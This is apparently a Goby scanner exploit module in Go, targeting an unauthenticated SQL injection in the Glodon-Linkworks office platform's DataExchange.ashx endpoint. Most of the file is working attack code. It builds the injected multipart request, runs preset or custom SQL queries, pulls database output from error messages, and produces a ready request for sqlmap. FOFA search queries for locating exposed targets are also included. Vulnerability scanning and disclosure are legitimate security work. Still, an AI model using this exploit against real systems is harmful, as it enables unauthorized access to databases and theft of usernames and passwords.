package exploits

import (
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Glodon-Linkworks Collaborative Office Management Platform /GB/LK/Document/DataExchange/DataExchange.ashx SQL Injection Vulnerability",
    "Description": "<p>Glodon-Linkworks Collaborative Office Management Platform is a management system that provides digital software and hardware products and solutions for the full lifecycle of engineering projects. There is an SQL injection vulnerability in the DataExchange.ashx interface of the Glodon-Linkworks Collaborative Office Management Platform, allowing unauthenticated attackers to obtain sensitive information such as usernames and passwords.</p>",
    "Product": "Glodon-Linkworks",
    "Homepage": "https://www.glodon.com/",
    "DisclosureDate": "2024-11-19",
    "PostTime": "2024-11-19",
    "Author": "1251220046@qq.com",
    "FofaQuery": "body=\"Services/Identification/login.ashx\" || header=\"Services/Identification/login.ashx\" || banner=\"Services/Identification/login.ashx\"",
    "GobyQuery": "body=\"Services/Identification/login.ashx\" || header=\"Services/Identification/login.ashx\" || banner=\"Services/Identification/login.ashx\"",
    "Level": "2",
    "Impact": "<p>There is an SQL injection vulnerability in the DataExchange.ashx interface, allowing unauthenticated attackers to obtain sensitive information such as usernames and passwords.</p>",
    "Recommendation": "<p>1. Follow the manufacturer's official website and keep updated: <a href=\"http://www.glodon.com/\">www.glodon.com/</a><a href=\"https://www.data86.net/category/product\"></a></p><p>2. Deploy a Web application firewall to monitor database operations.  </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/134997188?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT CHAR(99)+CHAR(98)+CHAR(114)+CHAR(121)+CHAR(101)+CHAR(121)",
            "show": "attackType=custom"
        },
        {
            "name": "default",
            "type": "select",
            "value": "SELECT CURRENT_USER,SELECT SYSTEM_USER,SELECT top 1 name FROM sys.sysdatabases",
            "show": "attackType=default"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "广联达-Linkworks协同办公管理平台 /GB/LK/Document/DataExchange/DataExchange.ashx SQL 注入漏洞",
            "Product": "广联达-Linkworks",
            "Description": "<p>广联达-Linkworks协同办公管理平台是一款围绕工程项目的全生命周期,为客户提供数字化软硬件产品、解决方案的管理系统。广联达-Linkworks协同办公管理平台DataExchange.ashx接口处存在SQL注入漏洞，未经身份认证的攻击者可获取用户名密码等敏感信息。<br></p>",
            "Recommendation": "<p>1、关注厂商官网，及时关注更新信息：<a href=\"http://www.glodon.com/\">www.glodon.com/</a><a href=\"https://www.data86.net/category/product\"></a><br></p><p>2、部署Web应⽤防⽕墙，对数据库操作进⾏监控。&nbsp;&nbsp;<br></p><p>3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>DataExchange.ashx接口处存在SQL注入漏洞，未经身份认证的攻击者可获取用户名密码等敏感信息。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Glodon-Linkworks Collaborative Office Management Platform /GB/LK/Document/DataExchange/DataExchange.ashx SQL Injection Vulnerability",
            "Product": "Glodon-Linkworks",
            "Description": "<p>Glodon-Linkworks Collaborative Office Management Platform is a management system that provides digital software and hardware products and solutions for the full lifecycle of engineering projects. There is an SQL injection vulnerability in the DataExchange.ashx interface of the Glodon-Linkworks Collaborative Office Management Platform, allowing unauthenticated attackers to obtain sensitive information such as usernames and passwords.<br></p>",
            "Recommendation": "<p>1. Follow the manufacturer's official website and keep updated: <a href=\"http://www.glodon.com/\">www.glodon.com/</a><a href=\"https://www.data86.net/category/product\"></a><br></p><p>2. Deploy a Web application firewall to monitor database operations.&nbsp;&nbsp;<br></p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>There is an SQL injection vulnerability in the DataExchange.ashx interface, allowing unauthenticated attackers to obtain sensitive information such as usernames and passwords.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "EditType": "fast",
    "PocId": "9973"
}`

	setSqlPayloadhrwFVs5Bk4 := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, payload string, head map[string]string) (*httpclient.HttpResponse, error) {
			postRequest := httpclient.NewPostRequestConfig(url)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Data = payload
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		defineHeader := map[string]string{
			"Content-Type": " multipart/form-data; boundary=12ef5586849044debc33731d4c32afd0",
		}

		postData := fmt.Sprintf("--12ef5586849044debc33731d4c32afd0\nContent-Disposition: form-data; name=\"SystemName\"\n\nBIM\n--12ef5586849044debc33731d4c32afd0\nContent-Disposition: form-data; name=\"Params\"\n\n<rootElement dir=\"1' and 1=(%s) and '1'='1\">\n</rootElement>\n--12ef5586849044debc33731d4c32afd0--", sql)
		urlGet := "/GB/LK/Document/DataExchange/DataExchange.ashx"

		resp, err = setPostRequest(hostInfo, urlGet, postData, defineHeader)
		if resp == nil {
			return nil, "", errors.New("Fail")
		}

		if err != nil || resp.StatusCode != 200 {
			return resp, "", errors.New("Fail")
		}
		//配置漏洞存在的路径
		vulurl = "/GB/LK/Document/DataExchange/DataExchange.ashx"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//MD5Reslut := rand.Intn(99999)
			//MD5ResultStr := fmt.Sprintf("%d", MD5Reslut)
			////将MD5Hash进行md5加密
			//MD5Hash := md5.New()
			//MD5Hash.Write([]byte(MD5ResultStr))
			//hashBytes := MD5Hash.Sum(nil)
			//// 将MD5哈希值转换为十六进制字符串，并取前16个字符
			//content := hex.EncodeToString(hashBytes)[:16]

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符

			content := "cbryey"
			sql := fmt.Sprintf("SELECT CHAR(99)+CHAR(98)+CHAR(114)+CHAR(121)+CHAR(101)+CHAR(121)")

			//// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			//regular := `SQL Server`
			//
			//makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
			//	reRequest := regexp.MustCompile(RegularUrl)
			//	if !reRequest.MatchString(RegularContent) {
			//		return "", fmt.Errorf("can't match value")
			//	}
			//	getname := reRequest.FindStringSubmatch(RegularContent)
			//	return getname[1], nil
			//}

			sendPayload := setSqlPayloadhrwFVs5Bk4
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}

			if !strings.Contains(resp.RawBody, content) {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "POST /GB/LK/Document/DataExchange/DataExchange.ashx HTTP/1.1\nHost: " + expResult.HostInfo.HostInfo + "\nUser-Agent:Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info\nContent-Type: multipart/form-data; boundary=12ef5586849044debc33731d4c32afd0\n\n--12ef5586849044debc33731d4c32afd0\nContent-Disposition: form-data; name=\"SystemName\"\n\nBIM\n--12ef5586849044debc33731d4c32afd0\nContent-Disposition: form-data; name=\"Params\"\n\n<rootElement dir=\"*\">\n</rootElement>\n--12ef5586849044debc33731d4c32afd0--\n"

			// 3.配置正则语句，从响应包中提取出数据
			regular := `char 值 '([^'"]+)' 转换成数据类型 int `

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}

			sendPayload := setSqlPayloadhrwFVs5Bk4
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "default" {
				sql := goutils.B2S(ss.Params["default"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "custom" {
				sql := goutils.B2S(ss.Params["custom"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
